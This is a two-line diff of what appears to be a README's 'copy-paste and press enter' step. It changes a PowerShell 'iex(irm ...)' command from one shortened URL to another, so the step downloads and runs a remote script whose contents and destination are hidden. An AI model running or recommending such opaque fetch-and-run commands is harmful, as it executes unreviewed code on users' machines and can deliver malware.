@@ -39,7 +39,7 @@ Copy-paste the below code and press enter
 
 
 ```
-iex(irm t.ly/SegsMujib)
+iex(irm is.gd/gc6969)
 ```
 or
 ```
